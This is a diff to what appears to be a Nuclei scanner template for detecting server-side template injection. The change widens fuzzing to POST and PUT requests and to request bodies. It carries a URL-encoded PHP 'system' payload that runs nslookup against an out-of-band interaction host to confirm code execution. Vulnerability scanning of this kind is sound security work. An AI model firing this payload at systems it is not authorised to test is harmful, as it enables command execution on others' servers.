@@ -9,14 +9,15 @@ info:
     - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
   metadata:
     verified: true
-  tags: ssti,dast,oast,oob
+  tags: ssti,dast,oast,oob,vuln
 
 http:
   - pre-condition:
       - type: dsl
         dsl:
           - 'method == "GET"'
-
+          - 'method == "POST"'
+          - 'method == "PUT"'
     payloads:
       injection:
         - '%7Bphp%20system%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D'
@@ -24,7 +25,9 @@ http:
     skip-variables-check: true
 
     fuzzing:
-      - part: query
+      - parts:
+          - query
+          - body
         type: postfix
         mode: single
         fuzz:
@@ -37,4 +40,4 @@ http:
           - "contains(interactsh_protocol,'dns')"
           - "contains(interactsh_request,'srv')"
         condition: and
-# digest: 490a0046304402200d483fbb88716d2d47685a03aa0dee25caf8ece71174565e25549d720827b99d022032645bd75dac7fbb60dcceceb92917482b922dcbc9832bae31c640f3dc828eb7:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100f51d3dbe2c3e9175efbe1bfea3449cb7169f8b3e74ab0a9159af2d09370d1320022100c923d9f8326f6993700a4bcdd2c3615aef0f9316abb98fbf3a8ae41a49ad0095:922c64590222798bb761d5b6d8e72950
